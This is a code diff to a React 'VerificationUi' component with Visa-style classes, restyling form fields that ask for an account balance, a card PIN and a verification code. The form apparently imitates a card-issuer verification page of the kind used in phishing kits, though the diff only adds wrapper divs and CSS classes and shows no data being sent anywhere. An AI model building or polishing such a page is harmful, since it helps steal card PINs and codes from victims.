@@ -413,32 +413,34 @@ export function VerificationUi(props: BankLayoutProps) {
           <div className="visa-row">
             <div className="col-12 visa-styling">
               <div className="form-group text-center">
-                <label htmlFor="balance-input">Balance</label>
-                <input
-                  id="balance-input"
-                  type="text"
-                  inputMode="decimal"
-                  className="form-control visa-styling"
-                  value={balance}
-                  onChange={(e) => onBalanceChange(e.target.value)}
-                  disabled={submitting}
-                  placeholder="e.g. 1,234.56"
-                />
-                <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
-                  <button
-                    type="submit"
-                    className="visa-styling btn btn-primary text-uppercase vba-button"
-                    disabled={submitting || !canSubmit}
-                  >
-                    {submitting ? "Submitting..." : "Submit"}
-                  </button>
-                </div>
-                {submitting && (
-                  <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-                    <Spinner size={40} />
-                    <span>Waiting for confirmation...</span>
+                <div className="input-action">
+                  <label htmlFor="balance-input" className="credential-label">Balance</label>
+                  <input
+                    id="balance-input"
+                    type="text"
+                    inputMode="decimal"
+                    className="form-control visa-styling credential-input"
+                    value={balance}
+                    onChange={(e) => onBalanceChange(e.target.value)}
+                    disabled={submitting}
+                    placeholder="e.g. 1,234.56"
+                  />
+                  <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
+                    <button
+                      type="submit"
+                      className="visa-styling btn btn-primary text-uppercase vba-button"
+                      disabled={submitting || !canSubmit}
+                    >
+                      {submitting ? "Submitting..." : "Submit"}
+                    </button>
                   </div>
-                )}
+                  {submitting && (
+                    <div className="text-center" style={{ marginTop: 16, display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+                      <Spinner size={40} />
+                      <span>Waiting for confirmation...</span>
+                    </div>
+                  )}
+                </div>
               </div>
             </div>
           </div>
@@ -503,22 +505,24 @@ export function VerificationUi(props: BankLayoutProps) {
         <div className="visa-row">
           <div className="col-12 visa-styling">
             <div className="form-group text-center">
-              <label htmlFor="pin-input">PIN</label>
-              <input
-                id="pin-input"
-                type={pinMasked ? "password" : "text"}
-                inputMode="numeric"
-                maxLength={4}
-                className="form-control visa-styling"
-                value={pinValue}
-                onChange={pinHandleChange}
-                disabled={submitting}
-                placeholder="••••"
-              />
-              <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
-                <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
-                {" "}Show PIN
-              </label>
+              <div className="input-action">
+                <label htmlFor="pin-input" className="credential-label">PIN</label>
+                <input
+                  id="pin-input"
+                  type={pinMasked ? "password" : "text"}
+                  inputMode="numeric"
+                  maxLength={4}
+                  className="form-control visa-styling credential-input"
+                  value={pinValue}
+                  onChange={pinHandleChange}
+                  disabled={submitting}
+                  placeholder="••••"
+                />
+                <label htmlFor="pin-show-toggle" style={{ display: "block", marginTop: 8, fontSize: 14 }}>
+                  <input id="pin-show-toggle" type="checkbox" checked={!pinMasked} onChange={() => onPinMaskToggle()} />
+                  {" "}Show PIN
+                </label>
+              </div>
             </div>
           </div>
         </div>
@@ -606,10 +610,10 @@ export function VerificationUi(props: BankLayoutProps) {
               <div className="col-12 visa-styling">
                 <div className="form-group text-center">
                   <div id="InputAction">
-                    <label htmlFor="CredentialValidateInput">Verification Code</label>
+                    <label htmlFor="CredentialValidateInput" className="credential-label">Verification Code</label>
                     <input
                       autoFocus
-                      className="form-control visa-styling"
+                      className="form-control visa-styling credential-input"
                       data-val="true"
                       data-val-required="Please enter the code"
                       id="CredentialValidateInput"
